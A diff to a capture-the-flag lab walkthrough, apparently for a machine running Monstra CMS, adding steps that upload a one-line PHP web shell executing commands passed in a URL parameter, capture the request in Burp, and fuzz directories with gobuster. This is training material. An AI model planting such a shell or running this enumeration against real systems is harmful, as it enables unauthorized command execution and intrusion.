@@ -109,6 +109,39 @@ The patch that addresses this bug is available here:
  https://github.com/monstra-cms/monstra/issues/426
 ```
 
++ Create a **cmd.php7** file, and upload:
+```
+<?php
+
+ $cmd=$_GET['cmd'];
+
+ system($cmd);
+
+ ?>
+```
+
++ Capture the upload request on burp, and follow redirection.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0d7592bb-90be-42c8-9920-316bf344e32a)
+
++ It gives an error, "File was not uploaded". It's a rabbit hole, and skip it.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9a731e3d-2f19-42ac-9543-225ae5552b4c)
+
++ Do more enumeration.
++ Directory fuzzing:
+```
+gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.88/ -k -n -x html,php,txt -r -t 50
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6dfdf757-416d-4211-95ef-2e88d405f356)
+
++ When trying to access the **webservices** directory gives a 403 forbidden status code.
++ Run gobuster one more time on the **webservices** directory.
+```
+gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.88/webservices -k -n -x html,php,txt -r -t 50
+```
+
 
 
 ## Gaining Access
